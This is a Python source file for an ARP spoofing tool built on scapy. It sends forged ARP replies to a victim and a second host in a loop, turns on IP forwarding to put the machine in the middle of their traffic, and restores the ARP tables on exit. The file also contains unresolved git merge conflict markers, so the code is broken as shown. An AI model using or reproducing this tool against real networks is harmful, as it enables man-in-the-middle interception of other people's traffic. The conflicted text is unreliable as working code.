#import libraries and modules
import scapy.all as scapy
import optparse
<<<<<<< HEAD
import sys, time
=======
import sys, time, subprocess
>>>>>>> 695b3e43b82ffef8380e8ee9a27b645b5a320d56


def get_args():
    '''
    Get command line arguments
    '''

    parser = optparse.OptionParser()
    parser.add_option("-v", "--victim", dest="v_ip", help="Victim IP address. This machine will be fooled into thinking that own MAC is associated to spoofed IP (e.g. the router's IP). Form: 000.000.000.000")
    parser.add_option("-s", "--spoof", dest="s_ip", help="IP address to spoof -machine own IP will be posing as. Form: 000.000.000.000")
    parser.add_option("-w", "--wait", dest="wait_time", type=int, default=1, help="Waiting time in between packets sent. Default: 1 second")

    (options, _) = parser.parse_args()

    if (not options.v_ip) or (not options.s_ip) :
        parser.error("[-] Specify the IP of victim and IP to spoof, using '-v <value>' AND '-s <value>' or use '--help' for more info")
        quit()
    else:
        return options.v_ip, options.s_ip, options.wait_time

def get_mac_from_ip(ip):
    '''
    Function taking an ip address and returning the associated MAC address

    :param ip: IP address of interest
    :return: mac_address
    '''
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    response_list, _ = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)

    mac_address = response_list[0][1].hwsrc

    return mac_address

def arp_spoof(victim_ip, spoof_ip):
    '''
    Function that continuously sends out fabricated ARP responses, to fool the victim_ip into thinking that the spoof_ip
    is associated with own MAC address

    :param victim_ip: IP of machine to fool (--> ARP response is going to be sent here; destination of ARP response)
    :param spoof_ip: IP of machine to pose as (--> IP of this machine is going to be sent to victim_ip)
    :return:
    '''

    victim_MAC = get_mac_from_ip(victim_ip) #get MAC associated with victin_IP

    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_MAC, psrc=spoof_ip) #op=2 - response package (op=1 is default and sends a request);NOTE: NO hwsrc specified --> defaults to own MAC

    scapy.send(packet, verbose=False)

def reset_ARP(victim_ip, spoof_ip):
    '''
    Reset Aictim IP machine ARP tables.

    :param victim_ip: IP address; ARP of this IP address is going to be restored;
    :param spoof_ip: IP address; the MAC address of IP address is going to be restored in the victim's ARP table;
    :return:
    '''

    victim_MAC = get_mac_from_ip(victim_ip)
    spoof_MAC = get_mac_from_ip(spoof_ip)

    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_MAC, psrc=spoof_ip, hwsrc=spoof_MAC) #hwsrc passed this time, in order to restore

    scapy.send(packet, verbose=False)



if __name__ == "__main__":

    v_ip, s_ip, wait_time = get_args()

    packet_counter = 0
    try:
<<<<<<< HEAD
        while True: #continuously sends fabricated ARP responses to keep own IP in ARP tables of victim and e.g. router
            arp_spoof(v_ip, s_ip)
            arp_spoof(s_ip, v_ip)

            packet_counter += 2 # 2 packets sent each iteration: 1 to victim IP and 1 to spoof IP
=======
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        while True:  #continuously sends fabricated ARP responses to keep own IP in ARP tables of victim and e.g. router
            arp_spoof(v_ip, s_ip)
            arp_spoof(s_ip, v_ip)

            packet_counter += 2  #2 packets sent each iteration: 1 to victim IP and 1 to spoof IP
>>>>>>> 695b3e43b82ffef8380e8ee9a27b645b5a320d56

            print(f"\r[+] Packets sent: {packet_counter}", end="")
            time.sleep(wait_time)

    except KeyboardInterrupt:
        print("\n[+] Shutting down program... Resetting ARP tables to original state... Please wait\n")
        reset_ARP(v_ip, s_ip)
        reset_ARP(s_ip, v_ip)
<<<<<<< HEAD
=======
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
>>>>>>> 695b3e43b82ffef8380e8ee9a27b645b5a320d56
        exit()

